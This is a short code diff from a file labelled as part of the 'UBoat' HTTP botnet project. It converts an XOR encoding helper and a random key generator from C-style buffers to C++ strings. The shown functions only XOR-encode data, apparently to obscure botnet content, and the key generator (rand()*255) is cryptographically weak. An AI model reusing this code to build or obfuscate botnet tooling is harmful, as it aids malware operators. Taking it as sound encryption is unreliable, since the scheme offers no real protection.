@@ -1,29 +1,27 @@
+/**
+ * This file is part of UBoat - HTTP Botnet Project
+ */
+
+#include <string>
+
 #include "xor.h"
-#include "WindowsCompat.h"
 
-char* XORInputKey(char* input, char* key, int inputLength, int keyLength)
+std::string XORInputKey(const std::string& input, const std::string& key)
 {
-	char* output = (char*)malloc(inputLength + 1);
-	output[inputLength] = 0;
-	for (int i = 0; i < inputLength; i++)
-		output[i] = input[i] ^ key[i % keyLength];
-	return output;
+    std::string output;
+
+    for (std::string::size_type i = 0; i < input.size(); i++)
+        output += input[i] ^ key[i % key.size()];
+
+    return output;
 }
 
-void FreeXORResult(char* input)
+std::string GenerateKey(int lenght)
 {
-	free(input);
-}
+    std::string key;
 
-char* GenerateKey(int length)
-{
-	char* buffer = (char*)malloc(length);
-	for (int i = 0; i < length; i++)
-		buffer[i] = rand() * 255;
-	return buffer;
-}
+    for (std::string::size_type i = 0; i < lenght; i++)
+        key += rand() * 255;
 
-void FreeKey(char* key)
-{
-	free(key);
+    return key;
 }
